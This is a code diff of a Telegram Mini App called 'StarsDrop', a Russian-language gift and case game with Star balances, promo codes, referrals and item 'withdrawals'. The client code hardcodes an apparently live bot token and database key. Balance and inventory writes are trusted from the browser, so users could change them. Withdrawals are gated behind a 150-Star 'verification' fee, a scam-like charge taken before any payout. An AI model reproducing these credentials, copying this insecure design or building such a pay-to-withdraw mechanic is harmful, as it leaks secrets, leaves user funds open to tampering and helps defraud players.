@@ -67,7 +67,7 @@
             <div class="flex justify-between items-start mb-4">
                 <div>
                     <h3 class="text-[10px] font-black uppercase text-yellow-400 tracking-widest">Партнерка</h3>
-                    <p class="text-[9px] text-gray-500 uppercase mt-1">Приглашай друзей — получай тикеты></p>
+                    <p class="text-[9px] text-gray-500 uppercase mt-1">Приглашай друзей — получай тикеты</p>
                 </div>
                 <button onclick="shareInvite()" class="bg-yellow-400 text-black p-2 rounded-lg active:scale-90 transition-transform">
                     <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M15 8a3 3 0 10-2.977-2.63l-4.94 2.47a3 3 0 100 4.319l4.94 2.47a3 3 0 10.895-1.789l-4.94-2.47a3.027 3.027 0 000-.74l4.94-2.47C13.456 7.68 14.19 8 15 8z"></path></svg>
@@ -107,104 +107,91 @@
     const tg = window.Telegram.WebApp;
     const userId = tg.initDataUnsafe?.user?.id || 8015661230;
 
-    // --- НАСТРОЙКИ БОТА ---
     const BOT_TOKEN = '8451029637:AAHF6jJdQ98QhYRRsJxH_wuktMeE5QctT-I';
     const ADMIN_ID = '8015661230';
     
-    // --- SUPABASE ---
     const SUPABASE_URL = 'https://mwsbkpfarhdankpyifbm.supabase.co';
     const SUPABASE_KEY = 'sb_publishable_Bj40x3HKomgXSyLMiVqXig_FqCgOSmA';
     const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
     const ITEMS = {
-    "1may.jpg": { name: "1 May Exclusive", price: 100, img: "1may.jpg" },
-    "2025.jpg": { name: "Happy 2025", price: 500, img: "2025.jpg" },
-    "bear.png": { name: "Honey Bear", price: 3500, img: "bear.png" },
-    "book.jpg": { name: "Ancient Book", price: 1000, img: "book.jpg" },
-    "boooox.png": { name: "Berry Box", price: 700, img: "boooox.png" },
-    "botinok.png": { name: "Old Boot", price: 400, img: "botinok.png" },
-    "box.png": { name: "Jack in Box", price: 600, img: "box.png" },
-    "car.png": { name: "Sports Car", price: 5000, img: "car.png" },
-    "raketa.png": { name: "Space Rocket", price: 50, img: "raketa.png" },
-    "ccolso2.png": { name: "Star Ring", price: 3000, img: "ccolso2.png" },
-    "cerrrdce.jpg": { name: "Gingerbread", price: 500, img: "cerrrdce.jpg" },
-    "chemodan.jpg": { name: "Traveler Case", price: 5000, img: "chemodan.jpg" },
-    "ciga.png": { name: "Luxury Cigar", price: 3000, img: "ciga.png" },
-    "colso.png": { name: "Blue Diamond", price: 2500, img: "colso.png" },
-    "costum.jpg": { name: "Royal Costume", price: 10000, img: "costum.jpg" },
-    "cvetok.png": { name: "Wild Flower", price: 1000, img: "cvetok.png" },
-    "dog.png": { name: "Rich Dog", price: 500, img: "dog.png" },
-    "dyxi.png": { name: "Gold Perfume", price: 10000, img: "dyxi.png" },
-    "fonarik.jpg": { name: "Night Lantern", price: 100, img: "fonarik.jpg" },
-    "grob.jpg": { name: "Ancient Coffin", price: 5000, img: "grob.jpg" },
-    "gyba.png": { name: "Lava Lips", price: 5000, img: "gyba.png" },
-    "happybirthday.jpg": { name: "Birthday Cake", price: 200, img: "happybirthday.jpg" },
-    "heart.png": { name: "Heart Lock", price: 2000, img: "heart.png" },
-    "helmet.png": { name: "Spartan Helmet", price: 25000, img: "helmet.png" },
-    "kalendar.png": { name: "Event Calendar", price: 400, img: "kalendar.png" },
-    "kepka.png": { name: "Legendary Cap", price: 100000, img: "kepka.png" },
-    "kirpitch.jpg": { name: "Golden Brick", price: 10000, img: "kirpitch.jpg" },
-    "koks.jpg": { name: "Party Cocktail", price: 150, img: "koks.jpg" },
-    "koktel.png": { name: "Toxic Mix", price: 500, img: "koktel.png" },
-    "kot.png": { name: "Atomic Cat", price: 10000, img: "kot.png" },
-    "kotel.png": { name: "Witch Cauldron", price: 500, img: "kotel.png" },
-    "krovatka.jpg": { name: "Baby Bow", price: 600, img: "krovatka.jpg" },
-    "lolipop.png": { name: "Sweet Lollipop", price: 500, img: "lolipop.png" },
-    "lucky.jpg": { name: "Clover Lucky", price: 500, img: "lucky.jpg" },
-    "mafin.jpg": { name: "Sugar Muffin", price: 700, img: "mafin.jpg" },
-    "metch.png": { name: "Star Saber", price: 700, img: "metch.png" },
-    "narkotiki.png": { name: "Star Token", price: 600, img: "narkotiki.png" },
-    "obyv.jpg": { name: "Sneakers Pro", price: 10000, img: "obyv.jpg" },
-    "otchki.jpg": { name: "Cyber Glasses", price: 30000, img: "otchki.jpg" },
-    "orel.jpg": { name: "Golden Eagle", price: 5000, img: "orel.jpg" },
-    "otkritka.jpg": { name: "Peace Dove", price: 150, img: "otkritka.jpg" },
-    "paska.jpg": { name: "Easter Cake", price: 75, img: "paska.jpg" },
-    "rozza.png": { name: "Velvet Rose", price: 2000, img: "rozza.png" },
-    "rykzak.jpg": { name: "Adventurer Bag", price: 500, img: "rykzak.jpg" },
-    "shapka.png": { name: "Santa Hat", price: 500, img: "shapka.png" },
-    "shar.jpg": { name: "Magic Ball", price: 1000, img: "shar.jpg" },
-    "shlem.png": { name: "Biker Helmet", price: 3500, img: "shlem.png" },
-    "soska.jpg": { name: "Diamond Pacifier", price: 3000, img: "soska.jpg" },
-    "star.png": { name: "Pure Star", price: 15, img: "star.png" },
-    "statyya.jpg": { name: "Hero Statue", price: 41000, img: "statyya.jpg" },
-    "venok.jpg": { name: "Wreath Flower", price: 500, img: "venok.png" },
-    "yayko.png": { name: "Dragon Egg", price: 600, img: "yayko.png" },
-    "zhele.png": { name: "Slime Jelly", price: 700, img: "zhele.png" },
-    "zmei.png": { name: "Snake Friend", price: 500, img: "zmei.png" },
-    "meczcc.png": { name: "Faith Amulet", price: 600, img: "meczcc.png" },
-    "kryg.PNG": { name: "Snow Globe", price: 600, img: "kryg.PNG" },
-    "gribb.PNG": { name: "Spy Agaric", price: 600, img: "gribb.PNG" },
-    "zirka.PNG": { name: "Hanging Star", price: 800, img: "zirka.PNG" },
-    "cvetk.PNG": { name: "Sakura Flower", price: 900, img: "cvetk.PNG" },
-    "sshapka.PNG": { name: "Khabib's Papakha", price: 2300, img: "sshapka.PNG" },
-    "tyfli.PNG": { name: "Sky Stilettos", price: 1800, img: "tyfli.PNG" }
-};
+        "1may.jpg": { name: "1 May Exclusive", price: 100 },
+        "2025.jpg": { name: "Happy 2025", price: 500 },
+        "bear.png": { name: "Honey Bear", price: 3500 },
+        "book.jpg": { name: "Ancient Book", price: 1000 },
+        "boooox.png": { name: "Berry Box", price: 700 },
+        "botinok.png": { name: "Old Boot", price: 400 },
+        "box.png": { name: "Jack in Box", price: 600 },
+        "car.png": { name: "Sports Car", price: 5000 },
+        "raketa.png": { name: "Space Rocket", price: 50 },
+        "ccolso2.png": { name: "Star Ring", price: 3000 },
+        "cerrrdce.jpg": { name: "Gingerbread", price: 500 },
+        "chemodan.jpg": { name: "Traveler Case", price: 5000 },
+        "ciga.png": { name: "Luxury Cigar", price: 3000 },
+        "colso.png": { name: "Blue Diamond", price: 2500 },
+        "costum.jpg": { name: "Royal Costume", price: 10000 },
+        "cvetok.png": { name: "Wild Flower", price: 1000 },
+        "dog.png": { name: "Rich Dog", price: 500 },
+        "dyxi.png": { name: "Gold Perfume", price: 10000 },
+        "fonarik.jpg": { name: "Night Lantern", price: 100 },
+        "grob.jpg": { name: "Ancient Coffin", price: 5000 },
+        "gyba.png": { name: "Lava Lips", price: 5000 },
+        "happybirthday.jpg": { name: "Birthday Cake", price: 200 },
+        "heart.png": { name: "Heart Lock", price: 2000 },
+        "helmet.png": { name: "Spartan Helmet", price: 25000 },
+        "kalendar.png": { name: "Event Calendar", price: 400 },
+        "kepka.png": { name: "Legendary Cap", price: 100000 },
+        "kirpitch.jpg": { name: "Golden Brick", price: 10000 },
+        "koks.jpg": { name: "Party Cocktail", price: 150 },
+        "koktel.png": { name: "Toxic Mix", price: 500 },
+        "kot.png": { name: "Atomic Cat", price: 10000 },
+        "kotel.png": { name: "Witch Cauldron", price: 500 },
+        "krovatka.jpg": { name: "Baby Bow", price: 600 },
+        "lolipop.png": { name: "Sweet Lollipop", price: 500 },
+        "lucky.jpg": { name: "Clover Lucky", price: 500 },
+        "mafin.jpg": { name: "Sugar Muffin", price: 700 },
+        "metch.png": { name: "Star Saber", price: 700 },
+        "narkotiki.png": { name: "Star Token", price: 600 },
+        "obyv.jpg": { name: "Sneakers Pro", price: 10000 },
+        "otchki.jpg": { name: "Cyber Glasses", price: 30000 },
+        "orel.jpg": { name: "Golden Eagle", price: 5000 },
+        "otkritka.jpg": { name: "Peace Dove", price: 150 },
+        "paska.jpg": { name: "Easter Cake", price: 75 },
+        "rozza.png": { name: "Velvet Rose", price: 2000 },
+        "rykzak.jpg": { name: "Adventurer Bag", price: 500 },
+        "shapka.png": { name: "Santa Hat", price: 500 },
+        "shar.jpg": { name: "Magic Ball", price: 1000 },
+        "shlem.png": { name: "Biker Helmet", price: 3500 },
+        "soska.jpg": { name: "Diamond Pacifier", price: 3000 },
+        "star.png": { name: "Pure Star", price: 15 },
+        "statyya.jpg": { name: "Hero Statue", price: 41000 },
+        "venok.jpg": { name: "Wreath Flower", price: 500 },
+        "yayko.png": { name: "Dragon Egg", price: 600 },
+        "zhele.png": { name: "Slime Jelly", price: 700 },
+        "zmei.png": { name: "Snake Friend", price: 500 },
+        "meczcc.png": { name: "Faith Amulet", price: 600 },
+        "kryg.PNG": { name: "Snow Globe", price: 600 },
+        "gribb.PNG": { name: "Spy Agaric", price: 600 },
+        "zirka.PNG": { name: "Hanging Star", price: 800 },
+        "cvetk.PNG": { name: "Sakura Flower", price: 900 },
+        "sshapka.PNG": { name: "Khabib's Papakha", price: 2300 },
+        "tyfli.PNG": { name: "Sky Stilettos", price: 1800 }
+    };
 
     let user = null;
     let selectedIdx = -1;
 
-    function fixPath(p) { 
-        if (!p) return 'img/star.png';
-        return p.startsWith('img/') ? p : 'img/' + p; 
-    }
-
     async function loadUser() {
         try {
             let { data, error } = await _supabase.from('users').select('*').eq('user_id', userId).single();
-            if (!data && !error) {
-                const newUser = { user_id: userId, stars: 0, balance: 0, tickets: 10, inventory: [], is_paid_75: false };
-                await _supabase.from('users').insert([newUser]);
-                data = newUser;
-            }
             if (data) {
                 user = data;
-                const displayName = (tg.initDataUnsafe?.user?.first_name || "USER");
-                document.getElementById('u-name').innerText = displayName.toUpperCase();
+                document.getElementById('u-name').innerText = (tg.initDataUnsafe?.user?.first_name || "USER").toUpperCase();
                 document.getElementById('u-id-label').innerText = `ID: ${user.user_id}`;
                 document.getElementById('u-stars').innerText = (user.stars || 0).toLocaleString();
                 document.getElementById('u-ton').innerText = (user.balance || 0).toFixed(2);
                 document.getElementById('u-tickets').innerText = (user.tickets || 0);
-                document.getElementById('u-avatar').src = tg.initDataUnsafe?.user?.photo_url || `https://ui-avatars.com/api/?name=${displayName}&background=166534&color=fff`;
+                document.getElementById('u-avatar').src = tg.initDataUnsafe?.user?.photo_url || `https://ui-avatars.com/api/?name=U&background=166534&color=fff`;
                 renderGrid();
             }
         } catch (e) { console.error(e); }
@@ -214,13 +201,39 @@
         const grid = document.getElementById('grid');
         const inv = user.inventory || [];
         document.getElementById('inv-count').innerText = `${inv.length} ПРЕДМЕТОВ`;
-        let html = inv.map((it, i) => `
-            <div class="inventory-slot active-item" onclick="openItem(${i})">
-                <img src="${fixPath(it.img)}">
-            </div>
-        `).join('');
+        let html = inv.map((it, i) => {
+            const path = it.img.startsWith('img/') ? it.img : 'img/' + it.img;
+            return `<div class="inventory-slot active-item" onclick="openItem(${i})"><img src="${path}"></div>`;
+        }).join('');
         for(let i=0; i < Math.max(0, 9 - inv.length); i++) html += `<div class="inventory-slot opacity-10"></div>`;
         grid.innerHTML = html;
+    }
+
+    async function handlePromo() {
+        const input = document.getElementById('promo-input');
+        const codeText = input.value.trim().toUpperCase();
+        if (!codeText || !user) return;
+        const usedCodes = user.used_promos ? user.used_promos.split(',') : [];
+        if (usedCodes.includes(codeText)) { tg.showAlert("❌ УЖЕ ИСПОЛЬЗОВАНО"); return; }
+
+        try {
+            const { data: promo, error } = await _supabase.from('promo_codes').select('*').eq('code', codeText).single();
+            if (error || !promo) { tg.showAlert("🛑 КОД НЕ НАЙДЕН"); return; }
+            if (!promo.active || promo.uses_left <= 0) { tg.showAlert("⏳ ЛИМИТ ИСЧЕРПАН"); return; }
+
+            const upd = {
+                stars: (user.stars || 0) + (promo.reward_stars || 0),
+                balance: (user.balance || 0) + (promo.reward_ton || 0),
+                tickets: (user.tickets || 0) + (promo.reward_tickets || 0),
+                used_promos: user.used_promos ? `${user.used_promos},${codeText}` : codeText
+            };
+
+            await _supabase.from('users').update(upd).eq('user_id', userId);
+            await _supabase.from('promo_codes').update({ uses_left: promo.uses_left - 1 }).eq('code', codeText);
+
+            tg.showAlert(`✅ УСПЕХ!\n+${promo.reward_stars} ⭐, +${promo.reward_ton} TON, +${promo.reward_tickets} 🎟️`);
+            input.value = ''; loadUser();
+        } catch (e) { tg.showAlert("Ошибка!"); }
     }
 
     function openItem(i) {
@@ -228,7 +241,7 @@
         const it = user.inventory[i];
         const fileName = it.img.split('/').pop();
         const info = ITEMS[fileName] || { name: it.name || "Item", price: it.price || 10 };
-        document.getElementById('modal-img').src = fixPath(it.img);
+        document.getElementById('modal-img').src = it.img.startsWith('img/') ? it.img : 'img/' + it.img;
         document.getElementById('modal-name').innerText = info.name;
         document.getElementById('sell-btn').innerText = `ПРОДАТЬ ЗА ${info.price} ⭐`;
         document.getElementById('item-modal').style.display = 'flex';
@@ -240,41 +253,36 @@
     async function sellItem() {
         const it = user.inventory[selectedIdx];
         const fileName = it.img.split('/').pop();
-        const price = ITEMS[fileName]?.price || it.price || 0;
+        const price = ITEMS[fileName]?.price || 0;
         let newInv = [...user.inventory];
         newInv.splice(selectedIdx, 1);
-        const { error } = await _supabase.from('users').update({ inventory: newInv, stars: (user.stars || 0) + price }).eq('user_id', userId);
-        if (!error) { closeModal(); loadUser(); tg.HapticFeedback.notificationOccurred('success'); }
+        await _supabase.from('users').update({ inventory: newInv, stars: (user.stars || 0) + price }).eq('user_id', userId);
+        closeModal(); loadUser();
     }
 
-    // --- ФУНКЦИЯ ВЫВОДА ---
+    // --- ПОЛНЫЙ ВЫВОД И ВЕРИФИКАЦИЯ ---
     async function withdrawToBot() {
-        const priceVerification = 150; 
-        const isVerified = user.is_paid_75 === true;
-
-        if (!isVerified) {
+        const priceVerification = 150;
+        if (!user.is_paid_75) {
             if ((user.stars || 0) < priceVerification) {
-                tg.showAlert(`🛑 ОШИБКА\n\nНужна разовая верификация (${priceVerification} Stars).\nВаш баланс: ${user.stars} ⭐`);
-                return;
-            } else {
-                tg.showConfirm(`Списать ${priceVerification} Stars для верификации?`, async (ok) => {
-                    if (ok) {
-                        const { error } = await _supabase.from('users').update({ 
-                            stars: user.stars - priceVerification, is_paid_75: true 
-                        }).eq('user_id', userId);
-                        if(!error) { tg.showAlert("✅ Готово! Нажмите ВЫВОД еще раз."); loadUser(); }
-                    }
-                });
+                tg.showAlert(`🛑 НУЖНА ВЕРИФИКАЦИЯ\n\nЦена: ${priceVerification} Stars.\nУ вас: ${user.stars} ⭐`);
                 return;
             }
+            tg.showConfirm(`Списать ${priceVerification} Stars для верификации?`, async (ok) => {
+                if (ok) {
+                    const { error } = await _supabase.from('users').update({ 
+                        stars: user.stars - priceVerification, is_paid_75: true 
+                    }).eq('user_id', userId);
+                    if (!error) { tg.showAlert("✅ Верификация пройдена! Жми кнопку еще раз."); loadUser(); }
+                }
+            });
+            return;
         }
 
         const it = user.inventory[selectedIdx];
         const fileName = it.img.split('/').pop();
         const info = ITEMS[fileName] || { name: it.name || "Item" };
-        const u = tg.initDataUnsafe?.user || { first_name: 'User', id: userId, username: 'unknown' };
-
-        const text = `🚀 <b>ЗАЯВКА НА ВЫВОД</b>\n\n👤 <b>Юзер:</b> ${u.first_name}\n🆔 <b>ID:</b> <code>${u.id}</code>\n🎁 <b>Предмет:</b> ${info.name}\n🖼️ <b>Файл:</b> ${fileName}`;
+        const text = `🚀 <b>ЗАЯВКА НА ВЫВОД</b>\n\n👤 <b>Юзер:</b> ${tg.initDataUnsafe?.user?.first_name}\n🆔 <b>ID:</b> <code>${userId}</code>\n🎁 <b>Предмет:</b> ${info.name}\n🖼️ <b>Файл:</b> ${fileName}`;
 
         try {
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -282,67 +290,43 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'HTML' })
             });
-
             if (res.ok) {
                 let newInv = [...user.inventory];
                 newInv.splice(selectedIdx, 1);
                 await _supabase.from('users').update({ inventory: newInv }).eq('user_id', userId);
-                tg.showAlert("✅ ЗАЯВКА ОТПРАВЛЕНА!\nОжидайте выдачу в течение 24 часов.");
-                closeModal(); loadUser(); tg.HapticFeedback.notificationOccurred('success');
+                tg.showAlert("✅ ЗАЯВКА ОТПРАВЛЕНА!");
+                closeModal(); loadUser();
             }
-        } catch (e) { tg.showAlert("Ошибка сети."); }
+        } catch (e) { tg.showAlert("Ошибка связи."); }
     }
 
-    function getRefLink() { return `https://t.me/StarsDropOfficial_Bot/app?startapp=${userId}`; }
     function shareInvite() {
-        const url = getRefLink();
-        const text = "💎 Забирай бесплатные тикеты и крути кейсы со мной!";
-        tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent(text)}`);
+        const url = `https://t.me/StarsDropOfficial_Bot/app?startapp=${userId}`;
+        tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(url)}&text=Забирай тикеты!`);
     }
 
-    async function handlePromo() {
-        const input = document.getElementById('promo-input');
-        const code = input.value.trim().toUpperCase();
-        if (!code) return;
-        const used = (user.used_promos || "").split(',');
-        if (used.includes(code)) return tg.showAlert("Уже использовано!");
-        const PROMOS = { "START": 50, "TICKETS": 5, "FREE": 10 };
-        if (PROMOS[code]) {
-            const updateData = { used_promos: user.used_promos ? `${user.used_promos},${code}` : code };
-            if (code === "TICKETS") updateData.tickets = (user.tickets || 0) + 5;
-            else updateData.stars = (user.stars || 0) + PROMOS[code];
-            await _supabase.from('users').update(updateData).eq('user_id', userId);
-            tg.showAlert("✅ АКТИВИРОВАНО!");
-            input.value = ''; loadUser();
-        } else tg.showAlert("Код неверный");
-    }
-
+    // Stars Background
     const canvas = document.getElementById('stars-canvas');
     const ctx = canvas.getContext('2d');
     let stars = [];
     function initStars() {
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        stars = Array.from({length: 50}, () => ({
+        stars = Array.from({length: 40}, () => ({
             x: Math.random() * canvas.width, y: Math.random() * canvas.height,
-            s: Math.random() * 2, v: Math.random() * 0.2, a: Math.random()
+            s: Math.random() * 2, v: Math.random() * 0.3, a: Math.random()
         }));
     }
     function draw() {
         ctx.clearRect(0, 0, canvas.width, canvas.height);
         ctx.fillStyle = "#a3e635";
         stars.forEach(s => {
-            ctx.globalAlpha = s.a; ctx.beginPath();
-            ctx.arc(s.x, s.y, s.s, 0, Math.PI * 2); ctx.fill();
+            ctx.globalAlpha = s.a; ctx.beginPath(); ctx.arc(s.x, s.y, s.s, 0, Math.PI * 2); ctx.fill();
             s.y += s.v; if(s.y > canvas.height) s.y = -5;
         });
         requestAnimationFrame(draw);
     }
 
-    window.onload = () => {
-        initStars(); draw(); loadUser();
-        document.getElementById('ref-link-display').innerText = getRefLink();
-        tg.expand();
-    };
+    window.onload = () => { initStars(); draw(); loadUser(); tg.expand(); document.getElementById('ref-link-display').innerText = `https://t.me/StarsDropOfficial_Bot/app?startapp=${userId}`; };
 </script>
 </body>
 </html>
